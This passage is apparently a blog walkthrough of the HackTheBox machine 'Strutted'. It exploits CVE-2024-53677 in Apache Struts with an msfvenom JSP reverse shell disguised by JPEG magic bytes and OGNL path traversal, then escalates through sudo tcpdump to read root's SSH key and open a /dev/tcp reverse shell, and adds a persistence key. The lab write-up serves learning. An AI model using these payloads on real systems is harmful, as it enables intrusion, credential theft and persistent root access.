sense.\nMaven pom.xml inspection: As discussed earlier, the pom.xml file is essentially the roadmap Maven uses to run its build process. You can think of it kind of like a Dockerfile, it defines all the dependencies, plugins, and configuration needed to build the project.\nHowever, unlike a Dockerfile, which always results in a container image, Maven gives you more flexibility. In Maven, you declare the type of artifact you want to produce, remember this artifact is just the build output. It could be a .jar, .war, binary, or even a directory structure depending on how the project is configured.\nIn this pom.xml we can see on lines 5-9 the artifact being generated when maven runs is a file called strutted it will be version 1.0.0 and it will be a .war file.\n\u0026lt;packaging\u0026gt;war\u0026lt;/packaging\u0026gt; \u0026lt;!-- artifact filetype --\u0026gt; \u0026lt;artifactId\u0026gt;strutted\u0026lt;/artifactId\u0026gt; \u0026lt;!-- artifact name --\u0026gt; \u0026lt;groupId\u0026gt;org.strutted.htb\u0026lt;/groupId\u0026gt; \u0026lt;!-- Organization/Company Name --\u0026gt; \u0026lt;version\u0026gt;1.0.0\u0026lt;/version\u0026gt; \u0026lt;!-- artifact version --\u0026gt; This artifact is then referenced in line 17 of the Dockerfile\nCOPY --from=0 /tmp/strutted/target/strutted-1.0.0.war /usr/local/tomcat/webapps/ROOT.war Comparison Between Dockerfile \u0026amp; pom.xml: If you\u0026rsquo;re struggling to grasp the difference sometimes its useful to look the similarities. This comparison table can help.\nFeature pom.xml (Maven) Dockerfile Purpose Defines how to build and manage a Java project Defines how to build a container image Output (Artifact) JAR, WAR, EAR, or other custom artifacts Container image Dependency Management Via \u0026lt;dependencies\u0026gt; No, external tools (e.g., apt, pip, etc are used.) Plugin Support Via \u0026lt;build\u0026gt;\u0026lt;plugins\u0026gt; Limited, depends on base image and OS tools Configuration Language XML Docker-specific syntax Standardization Highly standardized project layout and lifecycle (opinionated) Flexible, but less opinionated Execution Tool Maven CLI (mvn package, mvn install, etc.) Docker CLI (docker build, docker run, etc.) Lifecycle Phases Yes: clean, validate, compile, test, package, install, etc. No formal lifecycle, just runs instructions top-down Java Code Finds (Discovering a potentially vulnerable function): Looking through the java files. If we take a look at the Upload.java file located in src/main/java/org/strutted/htb, we can see the function isAllowedContentType is used to validate the MIME type of an uploaded file.\nIt checks whether the file\u0026rsquo;s content type is one of the following: \u0026quot;image/jpeg\u0026quot; \u0026quot;image/png\u0026quot; \u0026quot;image/gif\u0026quot;\nIf the file matches one of these types, the function returns true and allows the upload to proceed. Otherwise, it returns false, effectively blocking the file.\nThis presents a potential attack vector, because MIME types (also known as content types) can be manipulated during the upload process. For example, we could upload a malicious file and simply spoof the Content-Type header to appear as \u0026quot;image/jpeg\u0026quot;, potentially bypassing this check if there\u0026rsquo;s no further validation (e.g., inspecting file contents or extensions).\nprivate boolean isAllowedContentType(String contentType) { String[] allowedTypes = {\u0026#34;image/jpeg\u0026#34;, \u0026#34;image/png\u0026#34;, \u0026#34;image/gif\u0026#34;}; for (String allowedType : allowedTypes) { if (allowedType.equalsIgnoreCase(contentType)) { return true; } } return false; } This kind of check is only as strong as the trust placed in the incoming HTTP headers as on its own, it\u0026rsquo;s not sufficient to secure a file upload feature. For it to be effective further checks would need be required such as the following:\nExtension validation Magic byte (file signature) inspection (read on further as that\u0026rsquo;s what we find.) Virus/malware scanning Restricting file execution in upload directories Java Code Finds (Magic Bytes Inspection:) We can see below, this file upload check goes beyond simple file extension validation we saw previously. By reading the first few bytes (magic bytes) of the uploaded file and comparing them to known signatures for common image formats like JPEG, PNG, and GIF, it can determine if they have been modified. This helps ensure the file\u0026rsquo;s contents actually match the claimed format.\nIf the file\u0026rsquo;s header does not match one of these known formats, the function returns false, halting the upload process and triggering an error message (defined elsewhere). As a result, simply renaming a file\u0026rsquo;s extension is no longer sufficient to bypass the upload restriction.\nHowever, this check only validates upto the first 8 bytes of the file. So it could be possible to bypass the restrictions of this check by setting the first 8 bytes of the file to match the known values and then replace the rest of the content with malicious code.\n+Note+: The JPEG \u0026amp; PNG check only check the first 3 bytes whereas the GIF checks upto the first 8 bytes. private boolean isImageByMagicBytes(File file) { byte[] header = new byte[8]; try (InputStream in = new FileInputStream(file)) { int bytesRead = in.read(header, 0, 8); if (bytesRead \u0026lt; 8) { return false; } // JPEG if (header[0] == (byte)0xFF \u0026amp;\u0026amp; header[1] == (byte)0xD8 \u0026amp;\u0026amp; header[2] == (byte)0xFF) { return true; } // PNG if (header[0] == (byte)0x89 \u0026amp;\u0026amp; header[1] == (byte)0x50 \u0026amp;\u0026amp; header[2] == (byte)0x4E \u0026amp;\u0026amp; header[3] == (byte)0x47) { return true; } // GIF (GIF87a or GIF89a) if (header[0] == (byte)0x47 \u0026amp;\u0026amp; header[1] == (byte)0x49 \u0026amp;\u0026amp; header[2] == (byte)0x46 \u0026amp;\u0026amp; header[3] == (byte)0x38 \u0026amp;\u0026amp; (header[4] == (byte)0x37 || header[4] == (byte)0x39) \u0026amp;\u0026amp; header[5] == (byte)0x61) { return true; } } catch (Exception e) { e.printStackTrace(); } return false; } Java Code Finds (Upload Location \u0026amp; Naming Structure): +Note+: If you\u0026rsquo;re not interested in the breakdown of the code there is a TLDR at the end.\nLooking at the code Upload.java file again we can also see that from line 56-82 it details where files are uploaded \u0026amp; their naming convention.\nWe will break it down again so it is easier to digest and understand.\nString baseUploadDirectory = System.getProperty(\u0026#34;user.dir\u0026#34;) + \u0026#34;/webapps/ROOT/uploads/\u0026#34;; File baseDir = new File(baseUploadDirectory); if (!baseDir.exists() \u0026amp;\u0026amp; !baseDir.mkdirs()) { addActionError(\u0026#34;Server error: could not create base upload directory.\u0026#34;); return INPUT; } String baseUploadDirectory = System.getProperty(\u0026quot;user.dir\u0026quot;) + \u0026quot;/webapps/ROOT/uploads/\u0026quot;;\nThe Java code sets the baseUploadDirectory using the JVM\u0026rsquo;s (Java Virtual Machine) working directory (defined in the catalina.sh script), retrieved via System.getProperty(\u0026quot;user.dir\u0026quot;). Since no user or working directory is explicitly set in the Dockerfile, the application runs as the root user, and the default working directory becomes /usr/local/tomcat, as this is the base directory of the Tomcat container. As a result, the upload path resolves to /usr/local/tomcat/webapps/ROOT/uploads/. File baseDir = new File(baseUploadDirectory);\nThe application checks if this path exists and attempts to create it if it doesn\u0026rsquo;t, ensuring the upload directory is ready for use. if (!baseDir.exists() \u0026amp;\u0026amp; !baseDir.mkdirs())\nIf the directory doesn\u0026rsquo;t exist \u0026amp; it can\u0026rsquo;t make the directory it will throw an error. String timeStamp = new SimpleDateFormat(\u0026#34;yyyyMMdd_HHmmss\u0026#34;).format(new Date()); File timeDir = new File(baseDir, timeStamp); if (!timeDir.exists() \u0026amp;\u0026amp; !timeDir.mkdirs()) { addActionError(\u0026#34;Server error: could not create timestamped upload directory.\u0026#34;); return INPUT; } String timeStamp = new SimpleDateFormat(\u0026quot;yyyyMMdd_HHmmss\u0026quot;).format(new Date());\nThis line generates a string using the current date and time and saves it to the string variable timeStamp. The format is yyyyMMdd_HHmmss, which results in a value like 20250527_153024 (for May 27, 2025, 15:30:24). This timestamp ensures that each upload has a unique folder based on when it was created. File timeDir = new File(baseDir, timeStamp);\nThis creates a new File object that represents a subdirectory inside the previously created baseDir. For example as baseDir is /usr/local/tomcat/webapps/ROOT/uploads/, then timeDir becomes /usr/local/tomcat/webapps/ROOT/uploads/20250527_153024. if (!timeDir.exists() \u0026amp;\u0026amp; !timeDir.mkdirs()) { ... }\nThis checks if the timestamped folder already exists. If it doesn\u0026rsquo;t exist and it fails to create the directory using mkdirs(), then: An error message is added: \u0026quot;Server error: could not create timestamped upload directory.\u0026quot; The method returns INPUT, likely halting the upload process. String relativeImagePath = \u0026#34;uploads/\u0026#34; + timeStamp + \u0026#34;/\u0026#34; + uploadFileName; this.imagePath = relativeImagePath; String fullUrl = constructFullUrl(relativeImagePath); try { File destFile = new File(timeDir, uploadFileName); FileUtils.copyFile(upload, destFile); String shortId = generateShortId(); boolean saved = urlMapping.saveMapping(shortId, fullUrl); if (!saved) { addActionError(\u0026#34;Server error: could not save URL mapping.\u0026#34;); return INPUT; } String relativeImagePath = \u0026quot;uploads/\u0026quot; + timeStamp + \u0026quot;/\u0026quot; + uploadFileName;\nConstructs a relative path for the uploaded file. It starts in the uploads/ directory, adds the unique timestamped folder \u0026amp; then appends the original file name. For example: uploads/20250527_153024/profile.jpg this.imagePath = relativeImagePath;\nSaves the relative path to the current object\u0026rsquo;s imagePath property — likely used later to reference or display the image. String fullUrl = constructFullUrl(relativeImagePath);\nBuilds a full URL to access the uploaded file, e.g.: The method likely uses the server\u0026rsquo;s base URL and appends the relative path. File Upload Logic (Inside try block):\nFile destFile = new File(timeDir, uploadFileName);\nDefines the full destination file path for the upload. For example: /usr/local/tomcat/webapps/ROOT/uploads/20250527_153024/profile.jpg FileUtils.copyFile(upload, destFile);\nUses Apache Commons IO to copy the uploaded file from temporary storage (upload) to the destination (destFile). String shortId = generateShortId();\nGenerates a shortened identifier, likely for creating a shortened URL or a lookup key. boolean saved = urlMapping.saveMapping(shortId, fullUrl);\nSaves the mapping between the short ID and the full file URL. This might be used to retrieve the image via a short URL like: http://localhost:8080/i/abc123 if (!saved) { ... }\nIf saving the mapping fails (e.g., DB error), an error is logged and the operation halts. TLDR: In this section of the Upload.java file, the application handles where and how uploaded files are stored. It begins by defining a base upload directory at webapps/ROOT/uploads/, relative to Tomcat\u0026rsquo;s working directory (which defaults to /usr/local/tomcat/ inside the container). It then creates a unique timestamped subdirectory (e.g., uploads/20250527_153024/) to organize each upload session. Uploaded files are saved into these subfolders using their original filenames. After saving the file, the code constructs a full URL for access and generates a short ID mapping for simplified referencing. If any step, like directory creation, file copy, or URL mapping—fails, an error is thrown and the upload is halted.\nDiscovering the application is vulnerable to CVE-2024-53677: Checking the file inputFiles.lst that is in the /target/maven-status/maven-compiler-plugin/compile/default-compile folder we can see that it explicitly mentions CVE-2024-53677. If we check nist for that CVE number, we can see that this is a vulnerability that takes advantage of a file upload vulnerability present in Apache Struts, that can lead to file traversal \u0026amp; RCE. (Below is the description from the nist page.)\nFile upload logic in Apache Struts is flawed. An attacker can manipulate file upload params to enable paths traversal and under some circumstances this can lead to uploading a malicious file which can be used to perform Remote Code Execution. This issue affects Apache Struts: from 2.0.0 before 6.4.0. Users are recommended to upgrade to version 6.4.0 at least and migrate to the new file upload mechanism https://struts.apache.org/core-developers/file-upload . If you are not using an old file upload logic based on FileuploadInterceptor your application is safe. You can find more details in https://cwiki.apache.org/confluence/display/WW/S2-067 It says this affects struts from 2.0.0 and all version before 6.4.0. If we check the pom.xml file we can see that struts is listed as a dependency on line 37. If we then check for the \u0026lt;struts2.version\u0026gt; we can see on line 18 that the version being used is 6.3.0.1 so the version present in the application is vulnerable. +Note+: I am not sure if this is a mistake by the creator of the box or intentional however this is a pretty major find as it gives us a clear path forward. That is unless it\u0026rsquo;s a red-herring and we need to do a little more to actually exploit.\nSide Quest: What\u0026rsquo;s Apache Stuts: Checking the site here we get a good overview of what Apache Struts is, however here is an overview:\nApache Struts is an open-source Java web framework that helps build dynamic, database-driven websites. It uses the Model-View-Controller (MVC) pattern. That means the business logic (Model), UI (View), and application flow (Controller) each have their own place, which makes the codebase easier to manage, especially as the app grows. Apache Struts is flexible \u0026amp; integrates easily with other technologies. It\u0026rsquo;s funninly enough, maintained by the Apache community. As of writing, Struts 2 is the current version\nSide Quest: Understanding CVE-2024-53677: This took me a while to actually get all the information together to understand this exploit \u0026amp; how it works but trust me it\u0026rsquo;s interesting.\nYou need to have a grounding in two concepts for this to make sense so bare with me.\nSide Quest: What is OGNL (Object-Graph Navigation Language)? OGNL (Object-Graph Navigation Language) is a way for Apache Struts2 apps to access and manipulate Java objects (like properties, fields, methods) dynamically using string-based expressions. Basically it\u0026rsquo;s a language that lets you walk through Java objects and their properties using dot notation, like a map or a path.\nImagine you have an object like this in Java\nuser.getAddress().getCity(); In OGNL, that might look like\nuser.address.city Apache Struts2 uses OGNL to automatically bind data from HTTP requests to backend Java objects. That means if a user submits a form field called username, OGNL might take that value and do the following.\nuser.username = \u0026#34;value from request\u0026#34; OGNL can do much more than just accessing values, it can also call methods, manipulate data, and even execute Java code \u0026amp; that\u0026rsquo;s where things get dangerous as if insecurely configured as it can give attackers dynamic access to server-side objects and methods.\nSide Quest: Understanding the Value Stack: The value stack is a stack of Java objects that Struts2 uses to process a web request. At the top of this stack is the current Action object; which holds all the request data and business logic. The value stack is a temporary memory shelf that the framework uses to handle each web request.\nAt the top of that stack is the Action object, the Action object is the Struts2 class that handles what happens when a user makes a request. It receives data, runs backend logic, and returns a result. It\u0026rsquo;s the key target for OGNL-based attacks because it sits at the top of the value stack so therefore is the most accessible.\nIf you\u0026rsquo;re struggling to conceptualize the Action Object: Imagine a cook working in a busy pub/diner. Every time a customer places an order (a web request), the kitchen builds a stack of everything needed to prepare that meal, the ingredients (user input), cuttlery/plates (application data), and the recipe (business logic). At the very top of that stack is the recipe card that tells the cook exactly how to make the dish. That recipe card is the Action object.\nEvery time a user makes a request to a Struts2 application, Struts builds this stack of objects that hold all the data and logic for that request using a last-in-first-out data structure. It stores.\nAction objects (your backend code) User input (like form fields) Session \u0026amp; application data Here\u0026rsquo;s why all this that matters in the CVE-2024-53677 Vulnerability: OGNL expressions in parameters (like top.UploadFilename) can reference the top of the value stack.\nThis means if parameter filtering is too loose, an attacker can send something like the below.\nContent-Disposition: form-data; name=\u0026#34;top.UploadFilename\u0026#34; maclicious.jsp Which tells Struts2 to set the UploadFilename property of the top object (your Action class) to malicious.jsp\nThat change is subtle, but what it does is overwrites the filename on the backend, even if the client uploaded a safe-looking file like image.jpg. This would rename image.jpg to malicious.jsp which means if you can then access the file you could potentially get RCE (remote code execution by having that file processed).\n3. Foothold: Getting RCE on the host via CVE-2024-53677: Quick overview of how we will attack this host:\nAs we know the application expects an image to be uploaded as it does extension filtering \u0026amp; also checks for magic bytes, we also know that Apache Struts, suffers from an OGNL \u0026amp; vulnerability where we can directly manipulate the action object of the value stack so therefore we can upload a fake image by manipulating the magic bytes to match that of a real image (whilst still having a .jpg .gif etc extension) however we will embed a java based reverse shell within the file. We can then modify the image extension by manipulating the Action Object and therefore (should) be able to get RCE.\nCreating Our Malicious image/reverse-shell With msfvenom: This part is we simply create take a .jsp reverse shell and rename by giving it the extension .jpg .gif. We can do this easily with msfvenom\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=[yourIP] LPORT=[yourListeningPort] -f raw \u0026gt; shell.jsp Prepending Magic-Bytes To The reverse-shell To Bypass Validation: In order for this to work we are going to have to modify the extension by renaming it to shell.jpg and then we are going to have to prepend the magic-bytes so we can bypass the byte check that takes place.\n+Note+: We are going to go with .jpg format as this only requires we manipulate the first 3 bytes as opposed to first 8 for the .gif format.\nWhen I am doing a magic-byte bypass the best list I have found is here , it provides a list of magic bytes for various file formats.\nAs you can see on the page if we look for the jpg format we can see it lists the HEX/Header/Magic-Bytes value as FF D8 however this is only 2 bytes, so we will need to figure out what the other 1 byte will be. Luckily this is easy enough to do, we have 3 options here.\nRun hexdump on a jpg: hexdump /home/kali/Downloads/[jpgName].jpg | head -n 1 Now this is using big-endian notation so that means the order is reversed of the bytes in the columns so the correct order is.\nff d8 ff Read Existing Source Code: The second and easier option in this case is to read the code that checks the magic bytes as the values are actually hard-coded.\nif (header[0] == (byte)0xFF \u0026amp;\u0026amp; header[1] == (byte)0xD8 \u0026amp;\u0026amp; header[2] == (byte)0xFF) { return true; } Again we can see it\u0026rsquo;s FF D8 FF but in this case it\u0026rsquo;s displayed in hex format which we actually need for this. 0xFF 0xD8 0xFF\nIntercept An Upload From burpsuite: The third option is to just upload an image via burpsuite and select the bytes in the request and decode them\nAdding The Magic-Bytes With hexeditor: Now we have the magic bytes we can use hexeditor to pre-pend them to our shell.\nFirst we will open the shell in our text editor and add an additional empty line at the start, \u0026amp; just type 123, this is to allow space for our magic bytes to be prepended.\nSo the start of the file will now look like this.\n123 \u0026lt;%@page import=\u0026#34;java.lang.*\u0026#34;%\u0026gt; \u0026lt;%@page import=\u0026#34;java.util.*\u0026#34;%\u0026gt; [restOfFile] Now we use hexeditor add the necessary HEX bytes at the start\nhexeditor shell.jsp We can now just overwrite the first 3 bytes by manually typing in FF D8 FF\nBefore: After: We then hit CTRL+X to save.\nFinally we rename the payload.\ncp shell.jsp shell.jpg +Note+: I would advise copying as opposed to just moving/renaming as we may need to adjust.\nCrafting our Malicious Request: Adding An Additional Form-data field: Now we have our payload we need to upload it and modify the request to include the OGNL modification to rename our shell.jpg to shell.jsp\nTo do this we are going to add another form-data field, directly below the body of our upload shell.jpg data.\nTo do this we intercept the upload in burpsuite and add the following.\n------WebKitFormBoundaryolcNpSpn9Sn2GWqN Content-Disposition: form-data; name=\u0026#34;top.UploadFilename\u0026#34; +Note+: You are going to see the String following boundary change during the proceeding screenshots this is due to me having to try and modify certain things.\nDetermining Upload Location: We now need to determine where we are going to upload the file to, as the struts vulnerability allows for file traversal we need to place it in a directory where we know it will be processed as java/jsp code and not just statically served.\nTo determine this location we can look at the web.xml file located in /src/main/webapp/WEB-INF this is a configuration file used by the application.\n\u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;staticServlet\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/uploads/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; We can see that any (*) file placed in the /uploads/ folder path will use the staticServlet to serve the content. This servlet is used for static content only, images, text files, plain HTML etc. Meaning anything placed in here will not be processed using JSP. However we want to have our reverse shell processed and executed as code, so we will need to escape this folder.\nWe also know that all uploads are placed in their own time-stamped folder within /uploads/ we need to escape the time-stamped folder and the uploads folder so we will use ../../ to move up two directories.\nThis means our request now looks like the below.\n------WebKitFormBoundary olcNpSpn9Sn2GWqN Content-Disposition: form-data; name=\u0026#34;top.UploadFileName\u0026#34; ../../rev-shell.jsp Modifying The Upload Name To Bind Correctly with OGNL: This part took me an age to figure out and then research and discover, so bare with me.\nFirst let me quickly explain what a setter method is:\nSide Quest: Setter Methods:\nIn Java, a setter method is a function that lets other parts of the program assign a value to a private variable. In this case, Struts2 uses these setter methods to automatically take values from HTTP requests and pass them into the code. For example, setUploadFileName() lets the app receive a filename from the form and store it in a variable in a variable called UploadFileName.\nIf we look at the java code from Upload.java we can see some setter methods below.\npublic void setUpload(File upload) { this.upload = upload; } public void setUploadFileName(String uploadFileName) { this.uploadFileName = uploadFileName; } These are Java setter methods. OGNL maps them to property names by removing the set prefix and using what\u0026rsquo;s left (preserving the case).\nsetUpload() becomes the OGNL property Upload setUploadFileName() becomes the OGNL property UploadFileName Now that we know that let\u0026rsquo;s move on.\nOGNL Case Sensitivity:\nOGNL is case-sensitive when resolving property names and method calls (unless explicitly configured otherwise). Because it binds incoming HTTP parameters to Java object properties using their names, the case must match exactly.\nIn the form data we initially see the below is used.\nname=\u0026#34;upload\u0026#34; At first glance, this might seem trivial however, in Java, upload and Upload are not the same. Since OGNL tries to map the parameter name to the corresponding setter method in the Action class, if the case doesn\u0026rsquo;t match, it simply won\u0026rsquo;t bind the value as setupload is not the same as setUpload.\nWe also saw previously that the setter method is actual setUpload so this means the parameter name is actually Upload not upload.\nIf we were to try to exploit the upload using name=\u0026quot;upload\u0026quot; our additional form-data (like top.UploadFileName) gets ignored and the file is uploaded as usual to the default location, don\u0026rsquo;t believe me look at the below image where I have not corrected the case to match the setter method.\nSo knowing this we know we need to modify the form data to read name=\u0026quot;Upload\u0026quot; …with a capital U like below.\n------WebKitFormBoundarySETxW9w3w1WbVLqt Content-Disposition: form-data; name=\u0026#34;Upload\u0026#34;; filename=\u0026#34;shell.jsp\u0026#34; Content-Type: application/octet-stream Getting RCE by accessing our malicious image/shell: Now that we have modified these if we send our payload we should bypass the upload restrictions, rename our file, put it in a folder that can be processed as code when called and get our shell\n+Notes+: A word of warning: Ensure your Form-Data spacing is correct, it should look like the below Once we upload our request we will see in the response it has been uploaded successfully. If we now visit http://strutted.htb/rev-shell.jsp it will trigger our reverse shell and we will get a connection back to our attack machine. Enumerating As Tomcat: Now we have access let\u0026rsquo;s get enumerating for privilege Escalation paths.\nStabilizing Our Shell Using script: Upgrading Our Shell You can see the shell is very limited. After checking for python \u0026amp; socat we find they are not present. However we can use script to stabilize our shell.\nscript /dev/null -c /bin/bash Discovering the User James: Checking the /etc/passwd file we can see the user James exists and the description field has the string \u0026ldquo;Network Administrator\u0026rdquo; and as there are not other users apart from root to go after I think he will be our next logically target.\nChecking his home directory we cannot access it as expected.\nChecking lastlog we can see that the only two users to ever login have been root \u0026amp; james\nlastlog | grep -v \u0026#34;**Never logged in**\u0026#34; Discovering James\u0026rsquo; SSH password in the tomcat-users.xml file. After some manual enumeration if we check the tomcat-users.xml file in /var/lib/tomcat9/conf we can see that there is a password present. If we try it with the found user name james for the SSH service we can access the host. Let\u0026rsquo;s grab our user flag. 4. Privilege Escalation: Discovering James can run tcpdump as root: As soon as I get on any nix machine the first port of call is always running sudo -l to see if our user can run any commands as sudo. Doing so we discover james can run tcpdump as root. If we check gtfobins we can see there is a clear privilege escalation path to root by abusing the sudo tcpdump privileges.\nUsing TCPDUMP To Run Root Commands: Attempt 1: Copying The Root SSH key: First we sets a variable called COMMAND with the command that we want to run, read the root ssh key and save it to a location we control\nCOMMAND=\u0026#39;cat /root/.ssh/id_rsa \u0026gt;\u0026gt; /home/james/key.txt\u0026#39; We create a temporary file using mktemp, and assigns the path to a variable TF.\nTF=$(mktemp) Example output: /tmp/tmp.abc123\nWe now copy the content of the COMMAND variable into the temporary file TF. This writes the content of COMMAND into the file stored in TF.\necho \u0026#34;$COMMAND\u0026#34; \u0026gt; $TF We make the temp file executable so it can be run as a script and executed.\nchmod +x $TF This is where the abuse of tcpdump happens (the magic).\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root sudo tcpdump initiates the process as root. -ln – disables name resolution for IPs and ports. -i lo – captures on the loopback interface (lo). This interface is ALWAYS available. -w /dev/null – write the capture to /dev/null as we don\u0026rsquo;t actually need the .pcap. -W 1 – keeps only one capture file. -G 1 – rotates the capture file every 1 second (used with -w and -z). -z $TF – tells tcpdump to run the $TF script (our malicious script) after rotating the file. Usually this flag would be used to compress the capture file post rotation. -Z root – sets the user that runs the post-rotate script to root. This is the key part to the exploit: the script in $TF is executed as root because of -Z root, allowing us to execute the commands in the context of root.\nChecking to see if key.txt is now available and we can see the file is present. If we check the content we can see it contains the ssh key of the root user. Well well well after all that the root account still required a password when sshing in, so if you try and access with that key it will not work, instead lets give ourselves a reverse root shell using the same technique.\nAttempt 2: Getting A Root Reverse Shell: We use the same set of commands again, this time just modifying the malicious command.\nCOMMAND=\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.183/9090 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; TF=$(mktemp) echo \u0026#34;$COMMAND\u0026#34; \u0026gt; $TF chmod +x $TF sudo /usr/sbin/tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root +Note+: We are using a sub-shell e.g. bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.183/9090 0\u0026gt;\u0026amp;1' as otherwise this will not execute correctly.\nWe get a call back to our listener. Let\u0026rsquo;s get our root flag. 5. Persistence: Adding A Secondary Root SSH key: So typically what we could do is make a new user, however I am going to generate another key for the root user.\nGenerate SSH Key for the User: ssh-keygen -t rsa -b 4096 Copy Public Key to Authorized Keys:\ncp ~/.ssh/id_rsa2.pub ~/.ssh/authorized_keys This command copies the public key to the authorized_keys file, which is used by SSH to authenticate the user. Copy Private key to attack machine and put in it\u0026rsquo;s own file.\ncat id_rsa2 Change the mode of the key so the permissions are not too open:\nsudo chmod 400 id_rsa Verify it works:\nssh -i id_rsa2 root@$box Lessons Learned: What did I learn? Honestly there are too numerous to list, however I was able to utilize a lot of the knowledge I have from working in devops here, especially maven, tomcat \u0026amp; java. I also learned about apache struts which was fun. What silly mistakes did I make? Not so much silly, but it took a little research to realize about the case sensitivity of the setter method with OGNL, that held me up for a WHILE. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller@bloodstiller.com ",
